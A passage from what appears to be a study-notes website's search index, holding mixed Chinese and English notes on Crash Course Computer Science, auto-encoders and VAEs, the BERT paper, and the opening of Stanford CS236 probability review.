<p>\u8c26\u900a\u548c\u6210\u957f</p> <p>\u538c\u6076\u4ee5\u524d\u7684\u81ea\u5df1\uff0c\u80e1\u63d0\u5230\u4ed6\u6bcf\u4e09\u5230\u516d\u4e2a\u6708\u90fd\u4f1a\u201c\u6740\u6b7b\u201d\u4e00\u6b21\u81ea\u5df1\u3002\u5bf9\u6211\u800c\u8a00\uff0c\u6211\u975e\u5e38\u538c\u6076\u81ea\u5df1\u672a\u6765\u4f1a\u53d8\u6210\u90a3\u79cd\u601d\u7ef4\u56fa\u5316\u7684\u5927\u4eba\uff0c\u786e\u5b9e\u4eba\u8d8a\u662f\u6210\u957f\u5f80\u5f80\u8d8a\u662f\u504f\u4fe1\u81ea\u5df1\u7684\u7ecf\u9a8c\u548c\u7ed3\u8bba\u3002\u4ed4\u7ec6\u60f3\u6765\uff0c\u4ece\u5b66\u8bc6\u4e0a\u6765\u8bb2\u6211\u786e\u5b9e\u8981\u8d85\u8d8a\u6570\u6708\u524d\u7684\u81ea\u5df1\uff0c\u4f46\u662f\u5728\u65b9\u6cd5\u8bba\u548c\u4e16\u754c\u89c2\u4e0a\u662f\u5426\u6709\u8db3\u591f\u7684\u6210\u957f\u548c\u53d8\u5316\uff0c\u8fd9\u4e2a\u66f4\u662f\u503c\u5f97\u6211\u53bb\u53cd\u601d\u3002</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/computer%20crash%20course/","title":"computer crash course","text":"<p>\u8ba1\u7b97\u673a\u901f\u6210\u8bfe</p> <p>\u8fd9\u7bc7\u7b14\u8bb0\u5e76\u4e0d\u5b8c\u5168\uff0c\u63a8\u8350\u5927\u5bb6\u81ea\u5df1\u53bb\u770b\u5566\uff0cb\u7ad9\u4e0a\u641c\u7d22\u8ba1\u7b97\u673a\u901f\u6210\u8bfe\uff0c\u6709\u8f83\u4e3a\u7cbe\u81f4\u7684\u7ffb\u8bd1\u7248\u672c\uff0c\u975e\u5e38\u9002\u5408\u65b0\u624b\u5165\u95e8\u3002\u5e76\u4e14\u8fd9\u4e2a\u8bfe\u7a0b\u7684\u8986\u76d6\u8303\u56f4\u975e\u5e38\u7684\u5e7f\uff0c\u4e2a\u4eba\u611f\u89c9\u975e\u5e38\u9002\u5408\u5728\u51c6\u5907\u5206\u6d41\u9762\u8bd5\u7684\u65f6\u5019\u5b66\u4e60\u3002</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/computer%20crash%20course/#the-history-of-computer","title":"the history of computer","text":"<p>\u5f00\u5173\uff1a\u7ee7\u7535\u5668 \u771f\u7a7a\u7ba1 \u6676\u4f53\u7ba1 transistors become smaller, safer, and faster</p> <p>\u5e03\u5c14\u4ee3\u6570 the math base of computer</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/computer%20crash%20course/#data-storage-and-expression","title":"data storage and expression","text":"<p>binary we use a bit \u200bto express one 0 or 1</p> <p>and most of time we would put 8 bits together and we called it byte a byte = 8 bits</p> <p>we also heard the term 32-bit computer or 64-bit computer it means your computer is operating in chunks of 32 or 64 bits(\u5904\u7406\u4e00\u5757\u5757\u6570\u636e\uff0c\u6bcf\u5757\u662f32 \u6216\u8005 64 \u4f4d</p> <p>we need to express negative number and we often choose to check the first bit of a chunk of bits for sign negative or positive besides we need to express float number</p> <p>for text, we have ASCII to code each word like 'a' 'b' 'C' and some punctuation marks(\u6807\u70b9) or signs and it is enough for most of English text.</p> <p>however ASCII is only for English and if each coutry design a coding standard for their own language it's hard for exchange data. So when 1992, the unicode was born, it has 16bits could express every language on the world.</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/computer%20crash%20course/#calculate","title":"calculate","text":"<p>in computer we have ALU to do the calculation</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/computer%20crash%20course/#register-and-ram","title":"register and RAM","text":"<p>there three types way to store information hera we talked about register and RAM</p> <p>\u95e8\u9501\u662f\u4e00\u79cd\u53ef\u4ee5\u5b58\u50a8\u4e00\u4f4d\u6570\u636e\uff0c\u5e76\u4e14\u53ef\u4ee5\u9501\u5b9a\u5176\u4e2d\u6570\u636e\u6216\u8005\u89e3\u9501\u7684\u95e8\u7535\u8def\u7ed3\u6784</p> <p>\u200b\u200b</p> <p>register is a group of gate latches(\u95e8\u9501 it includes many bits, nowadays most of register is 64-bit, the number 64 is the width \u200bof the register register has two inputs and one output, the two inputs are the number we want to writing in and a enable write line to judge it can be wirtten or not. the output is to read the number in it.</p> <p>in fact we don't put the group of latches in line because it would use many wires we put them in grid(\u7f51\u683c), and we will use two number to loacte it.</p> <p>\u7531\u4e8e\u7f51\u683c\u5316\u7684\u5b58\u5728\uff0c\u6211\u4eec\u4e5f\u4f1a\u653e\u7f6e\u5bc4\u5b58\u5668\u4ee5\u7f51\u683c\u7684\u5f62\u5f0f\uff0c\u8fd9\u4e9b\u5bc4\u5b58\u5668\u5c31\u5f62\u6210\u4e86\u5185\u5b58 \u5185\u5b58\u9700\u8981\u5730\u5740\u53bb\u8bfb\u53d6\uff0c\u4f8b\u5982\u4e00\u4e2a16x16\u7684\u77e9\u9635  \u6211\u4eec\u53ef\u4ee5\u7528\u4e00\u4e2a\u516b\u4f4d\u7684\u5730\u5740\u53bb\u8bfb\u53d6\u5185\u5b58 \u4f8b\u598200110001 \u5176\u4e2d0011\u4e3a\u884c\u5730\u5740 0001\u4e3a\u5217\u5730\u5740 \u8fd9\u5c31\u5f62\u6210\u4e86RAM\uff0c\u968f\u7740\u8ba1\u7b97\u673a\u7684\u589e\u957f\uff0c\u4e0d\u65ad\u5730\u5c06\u5185\u5b58\u6253\u5305\uff0c\u7f51\u683c\u5316\uff0c\u589e\u957f\u5bfb\u5740\u4f4d\u6570</p> <p>\u9664\u4e86\u4e0a\u8ff0\u8bb2\u5230\u7684\u5185\u5b58\u7ed3\u6784\u4ee5\u5916\uff0c\u8fd8\u6709\u5176\u4ed6\u7684\u5185\u5b58\u7ed3\u6784\uff0c\u5728\u67b6\u6784\u4e0a\u76f8\u4f3c\uff0c\u53ea\u662f\u5b58\u50a8\u4f4d\u7684\u65b9\u5f0f\u4e0d\u540c\uff0c\u4e0a\u8ff0\u5185\u5b58\u91c7\u7528\u7684\u662f\u8be5\u7ed3\u6784\u7684latch</p> <p>\u672c\u8d28\u4e0a\u6765\u8bf4\u5bc4\u5b58\u5668\u5c31\u662f\u4e00\u5c0f\u5757\u5185\u5b58\uff0c\u800cRAM\u662f\u4e00\u5927\u5757\u5185\u5b58\uff0c\u9700\u8981\u5730\u5740</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/computer%20crash%20course/#cpu","title":"CPU","text":"<p>CPU\u7684\u6807\u51c6\u6307\u4ee4\u57fa\u672c\u5df2\u7ecf\u88abLC3\u5305\u542b\u4e86 \u4f46\u662f\u4e3a\u4e86\u63d0\u5347\u901f\u5ea6\uff0c\u6bd4\u5982\u9664\u6cd5\u53ef\u4ee5\u901a\u8fc7\u6807\u51c6\u6307\u4ee4\u5b9e\u73b0\uff0c\u4f46\u662f\u5982\u679c\u5355\u72ec\u4e3a\u9664\u6cd5\u505a\u4e00\u4e2a\u786c\u4ef6\u7535\u8def\uff0c\u6027\u80fd\u4f1a\u66f4\u597d \u5982\u4eca\u7684\u8ba1\u7b97\u673a\u82af\u7247\u4e2d\u4e3a\u56fe\u50cf\u5904\u7406\u7b49\u529f\u80fd\u90fd\u8bbe\u8ba1\u76f8\u5e94\u7684\u786c\u4ef6\u7535\u8def</p> <p>\u73b0\u4ee3\u7684\u8ba1\u7b97\u673aCPU\u90fd\u5305\u542b\u4e0a\u5343\u6761\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528\u7684\u786c\u4ef6\u6307\u4ee4 \u4f46\u662f\u968f\u7740CPU\u7684\u53d1\u5c55\uff0c\u9010\u6e10\u5730CPU\u7684\u6027\u80fd\u8fc7\u4e8e\u5f3a\u5927\uff0c\u5bfc\u81f4\u4e86\u6027\u80fd\u9650\u5236\u4e3b\u8981\u51fa\u73b0\u5728\u4e86RAM\u4e0a \u5185\u5b58\u7ed9CPU\u4f9b\u5e94\u6570\u636e\u7684\u80fd\u529b\u4e0d\u591f\u5f3a\u4e86</p> <p>\u56e0\u6b64\u6709\u4e86\u7f13\u5b58\uff0c\u7f13\u5b58\u5728CPU\u4e0a\uff0c\u7f13\u5b58\u4f7f\u5f97CPU\u4eceRAM\u4e0a\u53d6\u6570\u636e\u4ece\u53d6\u4e00\u4e2a\u53d8\u6210\u4e86\u53d6\u4e00\u6279\u6570\u636e \u56e0\u4e3a\u5f88\u591a\u60c5\u51b5\u4e0b\uff0c\u4e8e\u6211\u4eec\u73b0\u5728\u9700\u8981\u7684\u6570\u636e\u90fd\u4f1a\u653e\u5728\u4e00\u5757\uff0c\u540c\u65f6cache\u4e5f\u53ef\u4ee5\u4f5c\u4e3a\u590d\u6742\u8ba1\u7b97\u65f6\u7684\u4e34\u65f6\u5b58\u50a8\u7a7a\u95f4 \u6bcf\u5f53cache\u88ab\u4fee\u6539\u7684\u65f6\u5019\uff0ccpu\u4f1a\u5bf9\u5176\u8fdb\u884c\u8bb0\u5f55\uff0c\u7136\u540e\u4f1a\u5728\u5fc5\u8981\u7684\u65f6\u5019\u540c\u6b65\u7ed9ram</p> <p>\u9664\u4e86\u7f13\u5b58\u4ee5\u5916\uff0c\u8fd8\u6709\u5176\u4ed6\u7684\u63d0\u5347\u6027\u80fd\u7684\u65b9\u5f0f\uff0c\u6bd4\u5982\u6307\u4ee4\u6d41\u6c34\u7ebf \u6240\u8c13\u6d41\u6c34\u7ebf\u662f\u4e00\u79cd\u5e76\u884c\u5904\u7406\u7684\u65b9\u5f0f \u4f8b\u5982\uff0c\u6211\u4eec\u6709100\u4e2a\u6570\u636e\u8981\u987a\u5e8f\u7ecf\u5386A \u548c B\u4e24\u4e2a\u7a0b\u5e8f \u6570\u636e1\u7ecf\u5386A\u4e4b\u540e\uff0c\u6211\u4eec\u628a\u6570\u636e1\u653e\u5165B\u7684\u540c\u65f6\uff0c\u5e94\u5f53\u628a\u6570\u636e2\u653e\u5165A\u7a0b\u5e8f \u800c\u4e0d\u662f\u7b49\u5230\u6570\u636e1\u5b8c\u5168\u7ecf\u5386\u4e86A B\u4e4b\u540e\uff0c\u518d\u8ba9\u6570\u636e2\u5f00\u59cb\u64cd\u4f5c</p> <p>\u200b\u200b</p> <p>\u7b80\u5355\u6765\u8bf4\u4fbf\u662f\u5982\u4e0a\u4e24\u5f20\u56fe\u7684\u533a\u522b\uff0c\u8fd9\u6837\u53ef\u4ee5\u8ba9cpu\u7684\u6bcf\u4e2a\u90e8\u5206\u5728\u67d0\u4e2a\u65f6\u523b\u90fd\u5904\u4e8e\u8fd0\u884c\u72b6\u6001\uff0c\u5927\u5927\u63d0\u9ad8\u4e86\u6548\u7387 \u4f46\u662f\u4e5f\u5b58\u5728\u7740\u95ee\u9898\uff0c\u5c31\u662f\u90e8\u5206\u6307\u4ee4\u4e4b\u95f4\u53ef\u80fd\u5b58\u5728\u7740\u4f9d\u8d56\u5173\u7cfb\uff0c\u6bd4\u5982\u4e00\u4e2a\u6307\u4ee4\u4f1a\u4fee\u6539\u53e6\u4e00\u4e2a\u6307\u4ee4\u9700\u8981\u7684\u6570\u636e \u4ee5\u53ca\u6761\u4ef6\u95ee\u9898\uff0c\u67d0\u4e9b\u6307\u4ee4\u662f\u5426\u6267\u884c\uff0c\u9700\u8981\u7b49\u5f85\u4e0a\u9762\u7684\u6307\u4ee4\u7684\u5904\u7406\u7ed3\u679c</p> <p>\u4f46\u662f\u73b0\u5728\u7684cpu\u5df2\u7ecf\u8d70\u7684\u5f88\u8fdc\u4e86\uff0c\u5bf9\u4e8e\u6761\u4ef6\u8df3\u8f6c\u6307\u4ee4\uff0c\u73b0\u4ee3cpu\u4f1a\u5bf9\u5176\u8fdb\u884c\u9884\u6d4b\uff0c\u5e76\u4e14\u628a\u53ef\u80fd\u6027\u6700\u9ad8\u7684\u5206\u652f\u586b\u5165\u6d41\u6c34\u7ebf \u8be5\u79cd\u9884\u6d4b\u51c6\u786e\u6027\u5df2\u7ecf\u9ad8\u8fbe90%</p> <p>\u9664\u4e86\u4e0a\u8ff0\u4e24\u79cd\u65b9\u6cd5\u4ee5\u5916\uff0cCPU\u8fd8\u5b58\u5728\u8d85\u6807\u91cf\u65b9\u6cd5\u53bb\u63d0\u9ad8\u6027\u80fd\uff0c\u4f8b\u5982\u4f1a\u5c06\u4e00\u4e9b\u6307\u4ee4\u653e\u5728\u4e00\u5757\u6267\u884c \u4f8b\u5982\u4e00\u4e2a\u6307\u4ee4\u53ea\u662f\u7528ALU\uff0c\u4e00\u4e2a\u6307\u4ee4\u53ea\u8bbf\u95ee\u5185\u5b58\uff0c\u5b83\u4eec\u4e4b\u95f4\u53c8\u6ca1\u6709\u4ec0\u4e48\u5176\u4ed6\u7684\u4f9d\u8d56\u5173\u7cfb\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u653e\u5728\u4e00\u5757\u6267\u884c</p> <p>\u200b</p> <p>\u518d\u8fdb\u4e00\u6b65\uff0c\u6211\u4eec\u8fd8\u6709\u591a\u6838cpu\uff0c\u50cf\u662f\u4e00\u4e2a\u4e2a\u72ec\u7acb\u7684cpu\uff0c\u4f46\u662f\u4f1a\u516c\u7528\u7f13\u5b58\u7b49\u90e8\u4ef6\uff0c\u53ef\u4ee5\u8fdb\u884c\u66f4\u52a0\u5f3a\u5927\u7684\u5e76\u884c\u64cd\u4f5c \u66f4\u8fdb\u4e00\u6b65\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u62e5\u6709\u591a\u4e2a\u72ec\u7acb\u7684cpu\uff0c\u8fdb\u4e00\u6b65\u63d0\u9ad8\u6027\u80fd</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/computer%20crash%20course/#programming","title":"programming","text":"<p>we want to talked about how to write the instruction into RAM first  </p> <p>\u6700\u65e9\u7684\u65f6\u5019\u662f\u901a\u8fc7\u5f00\u5173\u7b49\u65b9\u5f0f</p> <p>\u5728\u73b0\u4ee3\uff0c\u7f16\u8bd1\u5668\u963b\u9694\u4e86\u7f16\u7a0b\u4eba\u5458\u548c\u786c\u4ef6\u90e8\u5206\uff0c\u5c06\u786c\u4ef6\u7f16\u7a0b\u8f6c\u6362\u6210\u4e86\u8f6f\u4ef6\u7f16\u7a0b \u5185\u90e8CPU\u5982\u4f55\u53bb\u64cd\u4f5c\u90fd\u7531\u7f16\u8bd1\u5668\u5b9e\u73b0</p> <p>\u65e9\u671f\u7684\u7f16\u7a0b\u8bed\u8a00\u5bf9\u5e94\u7684\u7f16\u8bd1\u5668\u53ea\u80fd\u5728\u4e00\u79cd\u673a\u5668\u4e0a\u8fd0\u884c\uff0c\u4e8e\u662f\u540e\u6765\u4eba\u4eec\u7ec4\u6210\u4e00\u4e2a\u7ec4\u7ec7\uff0c\u53bb\u5b9e\u73b0\u517c\u5bb9\u7684\u7f16\u8bd1\u5668</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/computer%20crash%20course/#software-engineering","title":"software engineering","text":"<p>there are many parts in software enigneering</p> <p>first is the oops-object oriented project, it has been something familar it is a good to split the whole work</p> <p>the second is the application programming interface(\u7a0b\u5e8f\u7f16\u7a0b\u63a5\u53e3 API \u8fd9\u662f\u4e00\u4e2a\u56e2\u961f\u8d1f\u8d23\u7684\u4ee3\u7801\u90e8\u5206\u6240\u63d0\u4f9b\u7684\u63a5\u53e3\u7684\u603b\u79f0\uff0c\u7528\u6765\u8bf4\u660e\u54ea\u4e9b\u529f\u80fd\u5bf9\u5916\u63d0\u4f9b\uff0c\u54ea\u4e9b\u529f\u80fd\u53ea\u5728\u5185\u90e8\u4f7f\u7528</p> <p>the third is IDE (vim is the best IDE</p> <p>the forth is source version control(\u4ee3\u7801\u7248\u672c\u7ba1\u7406 like git and SVN</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/computer%20crash%20course/#operate-system","title":"operate system","text":"<p>\u64cd\u4f5c\u7cfb\u7edf\u8054\u7cfb\u4e86\u8f6f\u4ef6\u548c\u786c\u4ef6 \u64cd\u4f5c\u7cfb\u7edf\u4e3a\u8f6f\u4ef6\u6240\u9700\u8981\u7684\u786c\u4ef6\u64cd\u4f5c\u63d0\u4f9b\u4e86\u6807\u51c6\u7684API \u4f7f\u5f97\u8f6f\u4ef6\u53ef\u4ee5\u4ee5\u6807\u51c6\u7684\u65b9\u5f0f\u53bb\u8bbf\u95ee\u786c\u4ef6</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/Auto-Encoder/Auto-Encoder/","title":"Auto-Encoder","text":"<p>Auto-Encoder\uff0c\u7b80\u79f0AE\uff0c\u662f\u901a\u8fc7\u4e24\u4e2aNN\u7f51\u7edc\uff0c\u6765\u8bad\u7ec3\u4e00\u4e2aEncoder\uff0c\u5c06\u4e00\u4e2a\u6bd4\u8f83\u5927\u7684\u8f93\u5165\u5411\u91cf\uff0c\u901a\u8fc7Encoder\u8f6c\u6362\u6210\u4e00\u4e2a\u7ef4\u5ea6\u6bd4\u8f83\u5c0f\u7684\u4e2d\u95f4Vector\uff0c\u7136\u540e\u7528\u4e00\u4e2aDecoder\u8fd8\u539f\u6210\u5c3d\u53ef\u80fd\u4e0e\u8f93\u5165\u76f8\u4f3c\u7684\u8f93\u51fa\u3002</p> <p>\u200b\u200b</p> <p>\u65e0\u5e8f\u6807\u6ce8\u597d\u7684\u6570\u636e\uff0c\u7406\u8bba\u4e0a\u6765\u8bf4\u7b97\u662f\u65e0\u76d1\u7763\u5b66\u4e60\u7684\u8303\u7574</p> <p>AE\u5f80\u5f80\u5e76\u4e0d\u662f\u6211\u4eec\u7684\u6700\u7ec8\u7ed3\u679c\uff0c\u4e00\u822c\u4f1a\u4f5c\u4e3a\u590d\u6742\u6a21\u578b\u7684\u4e00\u90e8\u5206\uff0c\u7528\u4e8e\u63d0\u9ad8\u8bad\u7ec3\u7684\u8d28\u91cf</p> <p>\u4ece\u7406\u8bba\u7684\u89d2\u5ea6\u6765\u8bb2\uff0cEncoder\u5fc5\u5b9a\u662f\u6709\u635f\u5931\u7684\uff0c\u6bd5\u7adf\u5411\u91cf\u7684\u5927\u5c0f\u5c31\u5728\u4e8e\u5176\u8868\u793a\u529b\uff0c\u4f46\u662f\u73b0\u5b9e\u751f\u6d3b\u4e2d\u7684\u56fe\u50cf\u4e5f\u597d\uff0c\u8bed\u97f3\u4e5f\u597d\uff0c\u90fd\u662f\u6709\u4e00\u5b9a\u89c4\u5f8b\u7684\uff0c\u5f53\u6211\u4eec\u968f\u673a\u751f\u6210\u4e00\u4e2a\u56fe\u50cf/\u8bed\u97f3\u7684\u65f6\u5019\uff0c\u5b83\u4eec\u5f80\u5f80\u4e0d\u662f\u6709\u89c4\u5f8b\u7684\uff0c\u65e2\u7136\u6709\u89c4\u5f8b\u7684\u6570\u636e\uff0c\u5c31\u53ef\u4ee5\u6709\u7279\u5f81\u8fdb\u884c\u63d0\u53d6\uff0c\u4e5f\u6709\u4e86\u538b\u7f29\u7684\u7a7a\u95f4\u3002</p> <p>Auto-encoder\u4e5f\u6709\u4e00\u4e9b\u53d8\u79cd\uff0c\u6bd4\u5982\u53bb\u566a\u7684\u7248\u672c</p> <p>\u200b\u200b</p> <p>\u4e5f\u53ef\u4ee5\u5229\u7528\u5728Feature Disentangle \u7279\u5f81\u89e3\u6784\u4e2d</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/Auto-Encoder/Auto-Encoder/#vae","title":"VAE","text":"<p>\u53d8\u5206\u81ea\u7f16\u7801\u5668\uff0c\u5728\u81ea\u7f16\u7801\u5668\u7684\u57fa\u7840\u4e0a\u8fdb\u4e00\u6b65\u505a\u53d8\u5206\u5904\u7406\uff0c\u76ee\u6807\u5728\u4e8e\u53d1\u5c55AE\u7684\u751f\u6210\u80fd\u529b</p> <p>\u9664\u4e86AE\u4ee5\u5916\uff0c\u8fd8\u6709\u4e00\u79cd\u77e9\u9635\u964d\u7ef4\u7684\u65b9\u5f0f\uff0c\u5c31\u662fPCA\uff0c\u4f7f\u7528SVD\u6765\u964d\u7ef4\u77e9\u9635\uff0c\u8fd9\u662f\u4e00\u4e2a\u7eaf\u6570\u5b66\u65b9\u6cd5\u3002</p> <p>\u200b\u200b</p> <p>\u4f20\u7edf\u7684AE\uff0c\u80fd\u591f\u5c06\u7279\u5b9a\u7684\u56fe\u5f88\u597d\u5730\u964d\u7ef4\u8fd8\u539f\uff0c\u4f46\u662f\u5982\u679c\u6211\u4eec\u9700\u8981\u628adecode\u90e8\u5206\u62ff\u51fa\u53bb\u4f5c\u4e3a\u4e00\u4e2a\u751f\u6210\u5668\uff0c\u6548\u679c\u5374\u662f\u975e\u5e38\u7cdf\u7cd5\uff0c\u975e\u7279\u5b9a\u56fe\u7247\u8bad\u7ec3\u8fc7\u7684\u5730\u65b9\uff0c\u751f\u6210\u7684\u5927\u6982\u7387\u662f\u4e71\u7801\uff0c\u6211\u4eec\u5e0c\u671b\u6bd4\u5982\u5706\u6708\u548c\u534a\u6708\u4e2d\u95f4\u7684\u70b9\u80fd\u591f\u751f\u6210\u56db\u5206\u4e4b\u4e09\u7684\u6708</p> <p>\u200b\u200b</p> <p>\u6211\u4eec\u5e0c\u671b\u7ed9\u6570\u636e\u589e\u52a0\u4e00\u4e9b\u7279\u6b8a\u7684\u566a\u58f0\uff0c\u4f7f\u5f97\u56fe\u7247\u4e0d\u6b62\u662f\u4f7f\u4e00\u4e2a\u70b9\u751f\u6548\uff0c\u800c\u662f\u5f71\u54cd\u4e00\u4e2a\u533a\u57df</p> <p>\u200b\u200b</p> <p>\u90a3\u4e48\u4e0a\u8ff0\u7684\u8fd9\u79cd\u5c06\u56fe\u50cf\u7f16\u7801\u7531\u79bb\u6563\u53d8\u4e3a\u8fde\u7eed\u7684\u65b9\u6cd5\uff0c\u5c31\u662f\u53d8\u5206\u81ea\u7f16\u7801\u7684\u6838\u5fc3\u601d\u60f3\u3002\u4ee5\u4e0b\u8fd9\u5f20\u56fe\u662fVAE\u7684\u6a21\u578b\u67b6\u6784</p> <p>\u200b\u200b</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/BERT/BERT/","title":"BERT","text":"<p>\u300aBERT: Pre-training of Deep Bidirectional Transformer for Language Understanding\u300b</p> <p>\u501f\u7531\u539f\u59cb\u8bba\u6587\u7684\u6807\u9898\u53ef\u4ee5\u770b\u51fa\uff0cBERT\u501f\u52a9\u4e86Transformer\u7ed3\u6784\uff0c\u5e76\u4e14\u662f\u53cc\u5411\u7684\u7ed3\u6784</p> <p>\u4e3b\u8981\u63d0\u5230\u53e6\u5916\u4e24\u4e2a\u8bed\u8a00\u6a21\u578b</p> <ul> <li>ELMo \u662f\u53cc\u5411\u7684\uff0c\u4f46\u662f\u4f7f\u7528\u4e86RNN</li> <li>GPT \u7528\u7684Transformer\uff0c\u4f46\u662f\u662f\u5355\u5411</li> </ul> <p>\u90a3\u4e48\u7531\u6b64\u63d0\u51fa\u4e00\u4e2a\u53cc\u5411\u7684Transformer\u7ed3\u6784\u7684\u4e00\u4e2a\u6a21\u578b</p> <p>\u5728\u5e94\u7528\u4e8e\u4e0b\u5c42\u4efb\u52a1\u7684\u65f6\u5019\uff0c\u4e0d\u9700\u8981\u4fee\u6539\u81ea\u8eab\u7684\u67b6\u6784</p> <p>\u5bf9\u4e8e\u4e4b\u524d\u7684\u8bed\u8a00\u6a21\u578b\uff0c\u90fd\u6709\u4e00\u4e2a\u7279\u5f81\u662f\u5355\u5411\u7684\uff0c\u5176\u53ea\u80fd\u901a\u8fc7\u524d\u6587\u53bb\u9884\u6d4b\u540e\u6587\u3002\u800cBERT\u8fdb\u884c\u4e86\u4e00\u4e9b\u521b\u65b0\uff0c\u8bbe\u7f6e\u4e00\u4e2dmask\u6280\u672f\uff0c\u5c06\u8bed\u53e5\u4e2d\u7684\u4e00\u4e9b\u8bcd\u8499\u4f4f\uff0c\u8ba9\u6a21\u578b\u8fdb\u884c\u5b8c\u5f62\u586b\u7a7a\uff0c\u5728\u8fd9\u4e2a\u8fc7\u7a0b\u4e2d\u5c31\u662f\u6240\u8c13\u7684\u53cc\u5411\u7684\u6280\u672f\uff0c\u4e5f\u5373\u4ece\u524d\u6587\u5b66\u4e60\u8f6c\u5230\u4e0a\u4e0b\u6587\u5b66\u4e60\u3002\u9664\u4e86\u8fd9\u4e2amask\u4efb\u52a1\u4ee5\u5916\uff0cBERT\u8fd8\u9884\u8bad\u7ec3\u4e00\u4e2a\u4e1c\u897f\u5c31\u662f\u201cnext sentence predict\u201d\uff0c\u5927\u6982\u5c31\u662f\u5728\u4e00\u7bc7\u6587\u7ae0\u91cc\u9762\u627e\u5230\u4e24\u4e2a\u53e5\u5b50\uff0c\u8ba9\u6a21\u578b\u6765\u9884\u6d4b\u8fd9\u4e24\u4e2a\u53e5\u5b50\u662f\u4e0d\u662f\u76f8\u90bb\u7684</p> <p>BERT\u7684\u6a21\u578b\u4f18\u52bf\u5728\u4e8e\u5176\u53ef\u4ee5\u5728\u5927\u91cf\u7684\u65e0\u6807\u8bb0\u6570\u636e\u4e0a\u8fdb\u884c\u8bad\u7ec3\uff0c\u5c31\u4e0a\u9762\u8fd9\u4e24\u4e2a\u4efb\u52a1\uff0c\u5176\u9700\u8981\u7684\u6570\u636e\u4e0d\u9700\u8981\u4eba\u5de5\u7684\u6807\u8bb0\uff0c\u53ef\u4ee5\u81ea\u52a8\u5316\u8bad\u7ec3\u8fc7\u7a0b</p> <p>pre-training and fine-tuning</p> <p>BERT\u5728\u9884\u8bad\u7ec3\u7684\u8fc7\u7a0b\u4e2d\u662f\u5728\u65e0\u6807\u8bb0\u6570\u636e\u4e2d\u7684\u3002\u7136\u540e\u5728\u9884\u8bad\u7ec3\u4e2d\u83b7\u5f97\u7684\u53c2\u6570\uff0c\u4f1a\u5728\u4e0b\u6e38\u4efb\u52a1\uff0c\u4e5f\u5c31\u662f\u90a3\u4e9b\u6709\u6807\u8bb0\u4efb\u52a1\u4e2d\u53c2\u4e0e\u8bad\u7ec3\uff0c\u8fd9\u4e2a\u8fc7\u7a0b\u5c31\u662f\u5fae\u8c03\uff0c\u83b7\u5f97\u4e00\u4e2a\u65b0\u7684\u53ef\u4ee5\u5229\u7528\u7684\u6a21\u578b</p> <p>Encoding\u7684\u8fc7\u7a0b</p> <p>\u200b\u200b</p> <p>\u5e94\u7528\u4e8e\u4e0b\u6e38\u4efb\u52a1\u4e2d</p> <p>BERT\u4e2d\u4f7f\u7528\u7684\u662f\u53ea\u6709\u7f16\u7801\u5668\u7684Transformer</p> <p>\u200d</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/CS236/CS236%20Deep%20Generative%20Models/","title":"CS236 Deep Generative Models","text":"<p>\u672c\u8bfe\u7a0b\u7684\u76ee\u6807\u4fa7\u91cd\u4e8e\u751f\u6210\u6a21\u578b\u3002</p> <ul> <li>\u8bfe\u7a0b\u89c6\u9891 Stanford CS236: Deep Generative Models I 2023 I Lecture 3 - Autoregressive Models (youtube.com)</li> <li>\u8bfe\u7a0b\u7f51\u7ad9 Stanford University CS236: Deep Generative Models</li> <li>\u8bfe\u7a0b\u7b14\u8bb0 Contents (deepgenerativemodels.github.io)</li> </ul>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/CS236/CS236%20Deep%20Generative%20Models/#0-review-for-probability-theory","title":"0. review for probability theory","text":"<p>\u8bbe\u5b9a\u4e00\u4e9b\u57fa\u7840\u6982\u5ff5</p> <ul> <li>\\(\\Omega\\) sample space \u6837\u672c\u7a7a\u95f4 random experiment \u6240\u6709\u53ef\u80fd\u7684\u7ed3\u679c</li> <li>\\(\\mathcal{F}\\) event space \u4e8b\u4ef6\u7a7a\u95f4 \u8fd9\u4e2a\u96c6\u5408\u91cc\u7684\u5143\u7d20\uff0c\u90fd\u662fsample space \u7684\u5b50\u96c6\u5408</li> <li> <p>\u51fd\u6570 \\(P: \\mathcal{F} \\rightarrow \\mathbb{R}\\) \u6ee1\u8db3</p> </li> <li> <p>\\(P(A)\\geq 0\\)</p> </li> <li>\\(P(\\Omega) = 1\\)</li> <li>\u5982\u679c \\(A_1...A_n\\) \u90fd\u662f\u72ec\u7acb\u4e8b\u4ef6\uff0c\u90a3\u4e48 \\(P(\\cup_i A_i) = \\sum_iP(A_i)\\)</li> </ul> <p>\u770b\u4e00\u4e2a\u4f8b\u5b50\u6709\u52a9\u7406\u89e3</p> <p>\u200b\u200b</p> <p>\u4e00\u4e9b\u5e38\u89c1\u7684\u7279\u6027\u5982\u4e0b</p> <p>\u200b\u200b</p> <p>conditional probability</p> 